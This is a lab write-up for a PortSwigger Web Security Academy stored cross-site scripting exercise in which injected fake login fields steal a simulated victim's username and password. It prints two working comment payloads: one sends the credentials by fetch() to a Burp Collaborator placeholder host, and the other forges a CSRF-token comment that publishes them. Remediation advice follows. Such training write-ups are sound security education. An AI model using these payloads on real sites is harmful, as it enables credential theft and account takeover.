# Exploiting Cross-Site Scripting to Capture Passwords

**Lab:** PortSwigger Web Security Academy — Cross-Site Scripting
**Difficulty:** Practitioner
**Category:** Stored XSS (Exploitation)

---

## Problem

The lab's blog comment function contains a stored XSS vulnerability. A simulated victim user automatically views all comments after they are posted, just as in the earlier cookie-exfiltration lab. Here, the goal is more invasive: exfiltrate the victim's actual **username and password** (rather than a session cookie) by tricking them into unknowingly entering credentials into a fake login form injected into the page, then use those credentials to log in as the victim.

**Note:** As with the cookie-theft lab, out-of-application exfiltration must go through Burp Collaborator's public server. An alternative, less subtle solution exists that doesn't require Collaborator.

---

## Discovery / Exploitation

1. Since passwords are never exposed anywhere in the DOM or `document.cookie` (unlike session tokens), the only way to capture one is to have the victim type it into an attacker-controlled input field.
2. Injected two fake `<input>` fields (username and password) as a blog comment — visually indistinguishable from a legitimate form once rendered on the page.
3. Attached an `onchange` event handler to the password field, which fires once the victim finishes typing and the field loses focus — mimicking a normal login interaction.
4. Used a length guard (`if(this.value.length)`) to avoid firing on an empty field, then sent the captured values via `fetch()` with `mode: 'no-cors'` to a Burp Collaborator subdomain, since the attacker only needs the server-side log of the request, not a readable response.

---

## Proof of Concept

**Primary solution — payload posted as a comment:**
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

**Steps:**
1. Generate a unique Burp Collaborator subdomain from the Collaborator tab (requires Burp Suite Professional).
2. Submit the payload above as a blog comment, inserting the Collaborator subdomain.
3. Wait for the simulated victim to view the comment; believing the injected fields are a normal part of the page, they may type credentials into them.
4. Poll Burp Collaborator for incoming interactions — a POST request with body `username:password` confirms successful capture.
5. Use the captured credentials to log in as the victim.

**Alternative solution (no Burp Collaborator required) — payload posted as a comment:**
```html
<input type="text" name="username">
<input type="password" name="password" onchange="hex()">

<script>
function hex() {
    var token = document.getElementsByName('csrf')[0].value;
    var username = document.getElementsByName('username')[0].value;
    var password = document.getElementsByName('password')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 8);
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'attacker@test.com');
    data.append('website', 'http://xml.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
}
</script>
```

**How the alternative works:** `hex()` reads the victim's own live CSRF token directly from the page (available because the script runs inside the victim's authenticated session), then forges a legitimate comment-submission request — using the victim's valid CSRF token — whose comment body is the captured `username:password` string. This publishes the victim's credentials publicly as a blog comment, readable by the attacker (or anyone) without needing an external listener at all. It is less subtle than the Collaborator approach since the credentials become publicly visible and leave direct evidence of the attack.

---

## Remediation

- **Fix the underlying stored XSS vulnerability first:** Proper HTML encoding of comment content remains the root-cause fix — neither credential-capture technique is possible without the initial unsanitized injection point.
- **Content Security Policy (CSP) with a restrictive `connect-src`:** A CSP limiting which domains the page can send requests to (e.g., `connect-src 'self'`) would block the `fetch()` call to an external Collaborator domain even if the injection succeeded, though it would not stop the CSRF-based alternative (which submits to the application's own origin).
- **`HttpOnly` cookies don't help here:** Unlike the cookie-theft lab, setting `HttpOnly` offers no protection against this credential-capture variant, since the attack never depends on reading `document.cookie` — the credentials are captured directly from user input.
- **Rate-limit and monitor for anomalous form submissions:** Detecting unusual patterns (e.g., a "comment" matching a `username:password` shape, or a sudden surge of comments from automated submission) can help catch the CSRF-based alternative technique even after the initial XSS is exploited.
- **Broader lesson — severity depends on the payload, not just the bug class:** This lab reinforces that stored XSS severity isn't capped at "popping an alert box." The same unsanitized input field can be leveraged into session theft, full credential theft, or complete account takeover, depending entirely on what the attacker chooses to inject. Where exfiltrated data ends up also matters: an external listener (Collaborator) is stealthier, while routing stolen data back through the vulnerable application's own functionality (as in the alternative solution) needs no external infrastructure but trades subtlety for public exposure.
